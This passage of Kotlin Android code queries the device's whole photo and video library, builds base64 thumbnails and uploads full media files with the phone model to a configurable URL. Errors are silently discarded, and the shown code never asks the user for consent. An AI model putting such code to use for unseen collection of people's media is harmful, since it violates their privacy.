                    val album = if (albumCol >= 0) c.getString(albumCol) ?: "所有照片" else "所有照片"

                    val uri = android.content.ContentUris.withAppendedId(android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                    var thumbB64 = ""
                    if (count < 120) {
                        try {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                val bmp = contentResolver.loadThumbnail(uri, android.util.Size(160, 160), null)
                                val bos = java.io.ByteArrayOutputStream()
                                bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 65, bos)
                                thumbB64 = "data:image/jpeg;base64," + android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP)
                                count++
                            }
                        } catch (e: Exception) {}
                    }
                    result.add(DevicePhoto(id, name, size, date, mime, album, thumbB64))
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        // 2. 同时查询相册全部视频 (Videos)
        try {
            val vidCollection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                android.provider.MediaStore.Video.Media.getContentUri(android.provider.MediaStore.VOLUME_EXTERNAL)
            } else {
                android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            }
            val vidProjection = arrayOf(
                android.provider.MediaStore.Video.Media._ID,
                android.provider.MediaStore.Video.Media.DISPLAY_NAME,
                android.provider.MediaStore.Video.Media.SIZE,
                android.provider.MediaStore.Video.Media.DATE_ADDED,
                android.provider.MediaStore.Video.Media.MIME_TYPE,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) android.provider.MediaStore.Video.Media.BUCKET_DISPLAY_NAME else android.provider.MediaStore.Video.Media._ID
            )
            val vCursor = contentResolver.query(vidCollection, vidProjection, null, null, queryLimitStr)
            vCursor?.use { c ->
                val idCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Video.Media._ID)
                val nameCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Video.Media.DISPLAY_NAME)
                val sizeCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Video.Media.SIZE)
                val dateCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Video.Media.DATE_ADDED)
                val mimeCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Video.Media.MIME_TYPE)
                val albumCol = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) c.getColumnIndex(android.provider.MediaStore.Video.Media.BUCKET_DISPLAY_NAME) else -1

                var vCount = 0
                while (c.moveToNext()) {
                    val id = c.getLong(idCol)
                    val name = c.getString(nameCol) ?: "video_$id.mp4"
                    val size = c.getLong(sizeCol)
                    val date = c.getLong(dateCol)
                    val mime = c.getString(mimeCol) ?: "video/mp4"
                    val album = if (albumCol >= 0) c.getString(albumCol) ?: "视频相册" else "视频相册"

                    val uri = android.content.ContentUris.withAppendedId(android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id)
                    var thumbB64 = ""
                    if (vCount < 60) {
                        try {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                val bmp = contentResolver.loadThumbnail(uri, android.util.Size(160, 160), null)
                                val bos = java.io.ByteArrayOutputStream()
                                bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, bos)
                                thumbB64 = "data:image/jpeg;base64," + android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP)
                                vCount++
                            }
                        } catch (e: Exception) {}
                    }
                    result.add(DevicePhoto(id, name, size, date, mime, album, thumbB64))
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        return result
    }

    private fun queryDevicePhotosSince(sinceSeconds: Long): List<DevicePhoto> {
        val result = mutableListOf<DevicePhoto>()
        val selection = "${android.provider.MediaStore.MediaColumns.DATE_ADDED} > ?"
        val selectionArgs = arrayOf(sinceSeconds.toString())

        try {
            val imgCollection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                android.provider.MediaStore.Images.Media.getContentUri(android.provider.MediaStore.VOLUME_EXTERNAL)
            } else {
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            }
            val imgProjection = arrayOf(
                android.provider.MediaStore.Images.Media._ID,
                android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                android.provider.MediaStore.Images.Media.SIZE,
                android.provider.MediaStore.Images.Media.DATE_ADDED,
                android.provider.MediaStore.Images.Media.MIME_TYPE,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) android.provider.MediaStore.Images.Media.BUCKET_DISPLAY_NAME else android.provider.MediaStore.Images.Media._ID
            )
            val cursor = contentResolver.query(imgCollection, imgProjection, selection, selectionArgs, "${android.provider.MediaStore.MediaColumns.DATE_ADDED} DESC")
            cursor?.use { c ->
                val idCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media._ID)
                val nameCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME)
                val sizeCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.SIZE)
                val dateCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATE_ADDED)
                val mimeCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.MIME_TYPE)
                val albumCol = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) c.getColumnIndex(android.provider.MediaStore.Images.Media.BUCKET_DISPLAY_NAME) else -1

                while (c.moveToNext()) {
                    val id = c.getLong(idCol)
                    val name = c.getString(nameCol) ?: "photo_$id.jpg"
                    val size = c.getLong(sizeCol)
                    val date = c.getLong(dateCol)
                    val mime = c.getString(mimeCol) ?: "image/jpeg"
                    val album = if (albumCol >= 0) c.getString(albumCol) ?: "所有照片" else "所有照片"
                    result.add(DevicePhoto(id, name, size, date, mime, album, ""))
                }
            }
        } catch (e: Exception) {}

        return result
    }

    private fun uploadSingleDevicePhoto(p: DevicePhoto, targetUrl: String) {
        try {
            val baseUri = if (p.mime.startsWith("video")) {
                android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            } else {
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            }
            val uri = android.content.ContentUris.withAppendedId(baseUri, p.id)
            val inputStream = contentResolver.openInputStream(uri) ?: return
            val bytes = inputStream.readBytes()
            inputStream.close()

            val boundary = "==AutoSync_${System.currentTimeMillis()}=="
            val url = java.net.URL(targetUrl)
            val conn = (url.openConnection() as java.net.HttpURLConnection).apply {
                requestMethod = "POST"
                doOutput = true
                useCaches = false
                setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                connectTimeout = 8000
                readTimeout = 10000
            }

            conn.outputStream.use { os ->
                val writer = java.io.PrintWriter(java.io.OutputStreamWriter(os, Charsets.UTF_8), true)
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n")
                writer.append(Build.MODEL).append("\r\n").flush()

                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"${p.name}\"\r\n")
                writer.append("Content-Type: ${p.mime}\r\n\r\n").flush()

                os.write(bytes, 0, bytes.size)
                os.flush()

                writer.append("\r\n").flush()
                writer.append("--$boundary--\r\n").flush()
            }

            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }
}
